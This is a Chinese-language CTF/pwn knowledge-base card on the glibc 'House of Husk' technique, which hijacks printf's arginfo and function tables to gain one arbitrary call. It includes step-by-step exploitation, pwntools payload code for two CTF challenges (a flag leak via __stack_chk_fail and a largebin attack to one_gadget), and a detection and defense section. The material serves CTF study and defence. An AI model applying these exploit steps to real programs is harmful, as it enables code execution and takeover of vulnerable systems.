---
id: binary-pwn-heap-house-of-husk-printf-arginfo-table
title: House of Husk：劫持 __printf_function_table 与 __printf_arginfo_table[spec] 实现一次任意函数调用
type: scenario
domain: binary
path: binary/pwn/heap
technique: house-of-husk-printf-arginfo-table
aliases:
- House of Husk
- printf_function_table
- printf_arginfo_table
- 格式化表劫持
- __parse_one_specmb call rax
- printf 任意函数调用
- 一次调用 one_gadget
tags:
- pwn
- heap
- glibc
- house-of-husk
- printf
- format-string
- printf-arginfo-table
- arbitrary-call
- one-gadget
- largebin-attack
- uaf
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V275
  verified_at: '2026-11-07T23:38:19+08:00'
  notes: 已对照原文与本地全部 5 图（02-06）：02 &__printf_arginfo_table=0x7f89a7f687b0、相对 libc base 0x7f89a7d7b000 偏移 +0x1ed7b0；03 telescope 显示 __printf_arginfo_table→0x55ba820eee10 堆 fake table、__printf_va_arg_table=0，并定位 __parse_one_specmb；04 反汇编 __parse_one_specmb+1632 处 cmp qword ptr [rip+0x170c18](__printf_function_table),0 / mov rax,[rcx+rdx*8]，rcx=堆地址、rdx=0x73('s')；05 断在 call rax，rax=0x7f89a7e9eafe(__execvpe+638, one_gadget)；06 &__printf_function_table=0x7f89a7f6c318、偏移 +0x1f1318 与 vmmap。卡内偏移、寄存器/索引解释、例1(0x4359B0 __stack_chk_fail/0x6b7a28/0x6b7aa8/argv[0] 泄露)与例2(largebin attack 写表+任意字节写 function_table+one_gadget+printf %s)均与原文 exp/gdb 一致。原文的 /photos/107.png 不在本地 img（未联网），其余 5 图已读。未验证点：未复跑两个 CTF 程序（静态 husk 与 libc 2.31 pwn）；frontmatter 无 sources/source_url；例2 仅说明 libc 2.31、例1 静态链接，原文未给 glibc 受影响版本区间，未设 affected_versions。kb show 存在；dedup top1 为自身，第二候选 binary-pwn-heap-house-of-husk-printf-arginfo-table-global-max-fast-onegadget(14821) 的写原语为 unsorted bin attack→放大 global_max_fast→main_arena fastbin
    数组改写两表、printf %X 调 one_gadget，与本卡的 largebin/.bss 大块写 + printf %s 例子不是同一写原语链，dup-scan 判 related；两卡同属 House of Husk 但写原语不同，按要求保留并列、不删较弱卡。卡为单一 House of Husk 技术原子（含两个应用例子），未过粗。
---

## 一句话结论

House of Husk 把 `__printf_function_table` 改为非空、把 `__printf_arginfo_table[spec]` 指向目标函数，下一次 `printf("%s", ...)` 在 `__parse_one_specmb` 中执行 `call [__printf_arginfo_table + spec*8]`，从而获得“以格式字符 ASCII 为索引的一次任意函数调用”；常用于一次 one_gadget 拿 shell，或用 `__stack_chk_fail` 打印 `argv[0]` 泄露 flag。

## 原理

- glibc 的 printf 支持自定义格式说明符：当 `__printf_function_table != NULL` 时，`vfprintf → printf_positional → __parse_one_specmb` 会查询 `__printf_arginfo_table[spec]`，对 `%s` 而言 `spec = 's' = 0x73`，即读取 `[__printf_arginfo_table + 0x73*8]` 处的函数指针并 `call rax`。
- spec 的索引就是格式字符的 ASCII 码：`%s`→0x73、`%p`→0x70、`%n`→0x6e 等；把目标函数地址写到表的对应偏移，下一次 printf 解析到该说明符时就会调用一次。
- 两个必要条件：`__printf_function_table` 非空（写任意非零值即可）；`__printf_arginfo_table` 指向攻击者可控内存（或指向自身/堆上的 fake table），并在 `[spec]` 位置放目标函数地址。
- 调用是“一次性”的，参数由调用点寄存器/栈状态决定（rdi 常指向格式串片段，rsi/rdx 等为解析状态）；因此通常配合 one_gadget（满足约束）或选择 `__stack_chk_fail` 这类对参数不敏感的函数。
- **例 1（静态链接 husk）**：利用可写 .bss 的大块输入修改 `__libc_argv[0]`，使其指向 flag 字符串地址；把 `__printf_function_table` 写为 1、`__printf_modifier_table` 写 0、`__printf_arginfo_table` 指向自身，并在 `[0x73]` 放 `__stack_chk_fail`。下一次 printf 触发 `__stack_chk_fail → __fortify_fail`，后者打印 `argv[0]`，从而把 flag 当程序名打印出来。
- **例 2（DASCTF X HDCTF 2024，libc 2.31）**：UAF 泄露 libc/heap；largebin attack 把堆地址写进 `__printf_arginfo_table`；用一次任意字节写把 `__printf_function_table` 置非零；堆上 fake table 的 `[0x73]` 放 one_gadget；触发 `printf("%s", ...)` 后 `call rax` 拿 shell。gdb 中 `rcx` 为 largebin attack 写入的堆地址、`rdx=0x73`、`rax` 为目标函数，最后 `call rax`。
- 根因：printf 扩展表是 libc 数据段中的可写函数指针表，程序只要拿到任意写/堆 UAF，就能在“下一次格式化输出”时把控制流导向表中的地址；表不在二进制 GOT 内，Full RELRO 并不能保护它。

## 触发条件

- 程序存在可把 `__printf_function_table` 改为非零、并把 `__printf_arginfo_table`（或其指向内容）改为可控地址的写原语（任意写、大块写、largebin attack、UAF 等）。
- 之后程序会调用 printf/ fprintf 等格式化输出，且格式串包含 `%s` 等已知说明符。
- 知道 libc 基址/静态二进制符号中 `__printf_function_table`、`__printf_arginfo_table` 的地址（或可泄露）。
- 目标函数地址可写，且 one_gadget 的寄存器约束可满足，或选用 `__stack_chk_fail` 等对参数不敏感的函数做泄露。

## 利用步骤

1. 通过 UAF/show 等泄露 libc 基址与堆地址。
2. 计算 `__printf_function_table`、`__printf_arginfo_table` 的地址（libc 符号表或静态二进制符号）。
3. 用任意字节写/大块写把 `__printf_function_table` 写成非零（如 0xff）。
4. 让 `__printf_arginfo_table` 指向可控内存（libc 可写段、堆 fake table、或自身），在 `[spec]` 位置写入目标函数地址；`%s` 对应 index 0x73。
5. 触发 printf/格式化输出，执行一次目标函数；按 one_gadget 约束调整，或改用 `__stack_chk_fail` 打印 `argv[0]` 泄露。
6. 例 2 用 largebin attack 把堆地址写入 `__printf_arginfo_table`；例 1 直接写静态 .bss 中的表。

## PoC

例 1（静态链接，`.bss` 大块写）：

```python
stack_chk_fail = 0x4359B0
flag_addr = 0x6B4040
name_addr = 0x6B73E0
libc_argv = 0x6b7980
printf_function_table = 0x6b7a28
printf_modifier_table = 0x6b7a30
printf_arginfo_table = 0x6b7aa8

payload = p64(flag_addr).ljust(libc_argv - name_addr, b'a')
payload += p64(name_addr)                         # __libc_argv[0] -> flag
payload = payload.ljust(printf_function_table - name_addr, b'a')
payload += p64(1)                                 # __printf_function_table != 0
payload += p64(0)                                 # __printf_modifier_table = 0
payload = payload.ljust(printf_arginfo_table - name_addr, b'a')
payload += p64(printf_arginfo_table)              # table[0] 自指
payload += p64(0xdeadbeef) * (0x73 - 1)
payload += p64(stack_chk_fail)                    # table[0x73] -> __stack_chk_fail
# 下一次 printf 触发 __stack_chk_fail → 打印 argv[0]（flag）
```

例 2（libc 2.31，largebin attack + one_gadget）核心：

```python
gift(printf_function_table, 0xff)                 # 任意字节写：__printf_function_table != 0
payload = p64(base+0x1ed010)*2 + p64(heapbase) + p64(printf_arginfo_table-0x20)
edit(0, 'xx', payload)                            # largebin attack：把堆地址写入 __printf_arginfo_table
# 堆 fake table 的 [0x73] 放 one_gadget；触发 printf("%s", ...) 后 __parse_one_specmb call rax
```

调用链：

```text
printf / vfprintf
→ printf_positional
→ __parse_one_specmb
→ rax = __printf_arginfo_table[spec]  # spec = 's' = 0x73
→ call rax
```

## 变体与关联

- 变体：说明符可换 `%p`（0x70）、`%n`（0x6e）等；目标函数可换 one_gadget、`__stack_chk_fail`、system（若参数可控）等。
- 变体：`__printf_arginfo_table` 可指向 libc 自身可写段（若能在其中布置目标地址）或堆上的 fake table；写入手段可用 largebin attack、UAF 写、任意字节写、大块 .bss 写。
- 关联：[[binary-pwn-heap-house-of-peach-top-chunk-sysmalloc-largebin]]（largebin attack 原语）、[[binary-pwn-heap-house-of-orange-unsortedbin-io-list-all-fsop-system]]（House 系列 FSOP 思路）、[[binary-pwn-heap-fsop-house-of-some-arbitrary-read-write]]（House of Some 任意读写）；largebin attack 与 UAF 相关的基础卡可一并参考。
- 边界：glibc 版本改变/移除 printf 扩展表（或表被只读保护）、只能调用一次且寄存器不满足 one_gadget、无法把表置非零、格式串不含可控说明符时链断。

## 检测与防御

- 检测：运行中 `__printf_function_table` 被写为非零、`__printf_arginfo_table` 指向堆/异常地址；gdb 断在 `__parse_one_specmb` 观察 `[rcx + rdx*8]` 与 `call rax`；进程出现 one_gadget/异常栈迁移。
- 防御：升级 glibc 并应用发行版补丁；启用 PIE/Full RELRO/Canary/NX、safe-linking 与堆硬化；限制任意写/UAF 原语；启用 CFI/CET 与 seccomp 降低一次性调用成功率。
- 加固：监控对 libc 数据段函数指针表的异常写（尤其是 `__printf_function_table`/`__printf_arginfo_table` 附近）；对格式化输出路径做完整性校验；在 CTF/生产环境评估 glibc printf 扩展表是否可被只读化。
